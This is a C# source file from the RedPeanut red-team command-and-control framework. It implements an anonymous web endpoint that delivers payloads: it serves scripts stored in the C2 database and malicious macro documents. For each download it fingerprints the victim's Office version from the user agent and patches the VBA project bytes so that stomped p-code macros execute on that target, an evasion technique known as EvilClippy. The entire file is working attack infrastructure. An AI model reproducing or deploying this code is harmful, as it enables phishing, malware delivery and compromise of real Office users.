//
// Author: B4rtik (@b4rtik)
// Project: RedPeanut (https://github.com/b4rtik/RedPeanut)
// License: BSD 3-Clause
//

using System;
using System.IO;
using System.Text;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Mvc;
using Microsoft.EntityFrameworkCore;
using Microsoft.Net.Http.Headers;
using OpenMcdf;
using static RedPeanut.Utility;

namespace RedPeanut
{

    [AllowAnonymous]
    public class HttpEvilClippyController : ControllerBase
    {
        private readonly RedPeanutDBContext dbContext = new RedPeanutDBContext(new DbContextOptions<RedPeanutDBContext>());

        private readonly IHttpContextAccessor httpContextAccessor;

        public HttpEvilClippyController(IHttpContextAccessor httpContextAccessor)
        {
            this.httpContextAccessor = httpContextAccessor;
        }

        private string GetMime(string filename)
        {

            switch(Path.GetExtension(filename))
            {
                case ".doc":
                    return "application/application/msword";
                case ".xlsm":
                    return "application/vnd.ms-excel.sheet.macroEnabled.12";
                case ".docm":
                    return "application/vnd.ms-word.document.macroEnabled.12";
                default:
                    return "";    
            }
        }

        private ActionResult GetTemplateFile(HttpRequest request, string filename)
        {
            if (request.Headers.ContainsKey(HeaderNames.UserAgent))
            {
                Console.WriteLine("Serving request from " + request.HttpContext.Connection.RemoteIpAddress + " with user agent " + request.Headers[HeaderNames.UserAgent]);

                CompoundFile cf = null;
                try
                {
                    cf = new CompoundFile(filename, CFSUpdateMode.Update, 0);
                }
                catch (Exception e)
                {
                    Console.WriteLine("ERROR: Could not open file " + filename);
                    Console.WriteLine("Please make sure this file exists and is .docm or .xlsm file or a .doc in the Office 97-2003 format.");
                    Console.WriteLine();
                    Console.WriteLine(e.Message);
                }

                CFStream streamData = cf.RootStorage.GetStorage("Macros").GetStorage("VBA").GetStream("_VBA_PROJECT");
                byte[] streamBytes = streamData.GetData();

                string targetOfficeVersion = UserAgentToOfficeVersion(request.Headers[HeaderNames.UserAgent]);

                ReplaceOfficeVersionInVBAProject(streamBytes, targetOfficeVersion);

                cf.RootStorage.GetStorage("Macros").GetStorage("VBA").GetStream("_VBA_PROJECT").SetData(streamBytes);

                // Commit changes and close file
                cf.Commit();
                cf.Close();

                Console.WriteLine("Serving out file '" + filename + "'");
                return File(System.IO.File.ReadAllBytes(filename), GetMime(filename));
            }
            else
            {
                return NotFound();
            }
        }

        static string UserAgentToOfficeVersion(string userAgent)
        {
            string officeVersion = "";

            // Determine version number
            if (userAgent.Contains("MSOffice 16"))
                officeVersion = "2016";
            else if (userAgent.Contains("MSOffice 15"))
                officeVersion = "2013";
            else
                officeVersion = "unknown";

            // Determine architecture
            if (userAgent.Contains("x64") || userAgent.Contains("Win64"))
                officeVersion += "x64";
            else
                officeVersion += "x86";

            Console.WriteLine("Determined Office version from user agent: " + officeVersion);

            return officeVersion;
        }

        private static byte[] ReplaceOfficeVersionInVBAProject(byte[] moduleStream, string officeVersion)
        {
            byte[] version = new byte[2];

            switch (officeVersion)
            {
                case "2010x86":
                    version[0] = 0x97;
                    version[1] = 0x00;
                    break;
                case "2013x86":
                    version[0] = 0xA3;
                    version[1] = 0x00;
                    break;
                case "2016x86":
                    version[0] = 0xAF;
                    version[1] = 0x00;
                    break;
                case "2013x64":
                    version[0] = 0xA6;
                    version[1] = 0x00;
                    break;
                case "2016x64":
                    version[0] = 0xB2;
                    version[1] = 0x00;
                    break;
                case "2019x64":
                    version[0] = 0xB2;
                    version[1] = 0x00;
                    break;
                default:
                    Console.WriteLine("ERROR: Incorrect MS Office version specified - skipping this step.");
                    return moduleStream;
            }

            Console.WriteLine("Targeting pcode on Office version: " + officeVersion);

            moduleStream[2] = version[0];
            moduleStream[3] = version[1];

            return moduleStream;
        }

        [AllowAnonymous]
        [HttpGet()]
        public ActionResult<string> Get(string filename)
        {
            
            Console.WriteLine("[*] Get content");
            // Api call used to deliver payload
            if (string.IsNullOrEmpty(filename))
            {

                Console.WriteLine("[x] File not found: null or empty filename");
                return NotFound();
            }

            if (RedPeanutC2.server.GetWebResource(filename, dbContext) == null)
            {
                Console.WriteLine("[x] File not found: resource not found");
                return NotFound();
            }
            else
            {
                try
                {
                    if(RedPeanutC2.server.GetWebResource(filename, dbContext).WebResourceType == Models.WebResourceType.Script)
                    {
                        string resurce = RedPeanutC2.server.GetWebResource(filename, dbContext).Content;
                        return Ok(resurce);
                    }
                    else
                    {
                        string file = Path.Combine(Directory.GetCurrentDirectory(), WORKSPACE_FOLDER, EVILCLIPPY_FOLDER, SanitizeFilename(filename));

                        if (!System.IO.File.Exists(file))
                        {
                            Console.WriteLine("[x] Assembly requested not found");
                            return NotFound();
                        }
                        else
                        {
                            try
                            {
                                return GetTemplateFile(Request, file);
                            }
                            catch (Exception)
                            {
                                Console.WriteLine("[x] Error reading assembly");
                                return NotFound();
                            }
                        }
                    }
                }
                catch (Exception)
                {
                    Console.WriteLine("[x] Generic error");
                    return NotFound();
                }
            }
        }

        private string SanitizeFilename(string filename)
        {
            return filename.Replace("\\", "")
                .Replace("/", "")
                .Replace("..", "");
        }
    }
}